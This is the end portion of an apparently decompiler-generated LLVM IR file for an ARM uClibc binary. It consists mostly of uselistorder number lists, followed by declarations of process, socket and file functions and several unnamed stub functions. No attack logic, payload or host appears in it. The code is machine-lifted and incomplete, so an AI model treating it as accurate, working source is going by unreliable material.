1074, 555, 583, 1075, 1076, 1077, 43, 1078, 212, 1079, 1080, 1081, 44, 1082, 1083, 1084, 1085, 1086, 556, 584, 1087, 1088, 1089, 45, 1090, 1091, 1092, 46, 331, 332, 1093, 1094, 1095, 1096, 1097, 557, 585, 1098, 1099, 1100, 47, 1101, 1102, 1103, 48, 1104, 1105, 1106, 49, 1107, 1108, 1109, 50, 1110, 1111, 1112, 1113, 51, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1126, 1127, 558, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 236, 1139, 1142, 1143, 1146, 1147, 1148, 52, 1144, 1145, 1140, 1141, 1149, 1150, 215, 214, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 53, 216, 1161, 1162, 1163, 54, 1164, 1165, 1166, 1167, 1169, 71, 335, 1170, 1168, 1124, 1125, 87, 1171, 559, 560, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 257, 1192, 258, 1193, 259, 1194, 1197, 1195, 1196, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231 }
  uselistorder i32* @r4, { 29, 469, 373, 374, 95, 96, 30, 375, 376, 377, 378, 379, 380, 31, 32, 323, 324, 33, 325, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 326, 327, 328, 329, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 346, 0, 347, 332, 333, 58, 59, 60, 61, 62, 301, 302, 303, 304, 111, 112, 344, 345, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 63, 64, 65, 66, 67, 68, 69, 2, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 98, 99, 1, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 3, 159, 4, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 5, 182, 6, 183, 7, 184, 8, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 9, 205, 10, 206, 11, 207, 12, 208, 209, 210, 13, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 14, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 15, 286, 16, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 305, 17, 306, 18, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 381, 382, 383, 348, 349, 350, 351, 352, 353, 19, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 366, 364, 365, 367, 368, 369, 370, 371, 372, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 23, 411, 412, 28, 413, 21, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 27, 20, 425, 426, 427, 428, 429, 430, 431, 26, 432, 433, 434, 25, 435, 436, 437, 24, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 470 }
}

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @atoi(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @raise(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1cd44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cd44, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 0, 2, 37, 3, 36, 1, 10, 12, 4, 5, 6, 35, 66, 67, 68, 9, 7, 8, 33, 62, 69, 40, 70, 71, 41, 72, 17, 18, 19, 20, 42, 73, 74, 58, 75, 76, 77, 47, 78, 22, 23, 48, 79, 49, 80, 43, 44, 45, 21, 81, 46, 82, 83, 57, 84, 85, 86, 87, 88, 89, 50, 51, 90, 91, 52, 92, 53, 54, 93, 55, 94, 56, 95, 38, 39, 96, 97, 98, 99, 100, 101, 24, 25, 59, 102, 103, 60, 31, 104, 61, 14, 15, 26, 16, 27, 28, 29, 11, 30, 105, 32, 63, 64, 106, 13, 65, 107, 34, 108 }
  uselistorder i1* @cpsr_z, { 8, 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @unknown_e28cca14() local_unnamed_addr

declare i32 @unknown_e5bcf034() local_unnamed_addr

declare i32 @unknown_e5bcf02c() local_unnamed_addr

declare i32 @unknown_e5bcf024() local_unnamed_addr

declare i32 @unknown_e5bcf01c() local_unnamed_addr

declare i32 @unknown_e5bcf014() local_unnamed_addr

declare i32 @unknown_e5bcf00c() local_unnamed_addr

declare i32 @unknown_e5bcf004() local_unnamed_addr

declare i32 @unknown_e28cca13() local_unnamed_addr

declare i32 @unknown_e5bcfffc() local_unnamed_addr

declare i32 @unknown_e5bcfff4() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_3() local_unnamed_addr

declare void (i32)* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
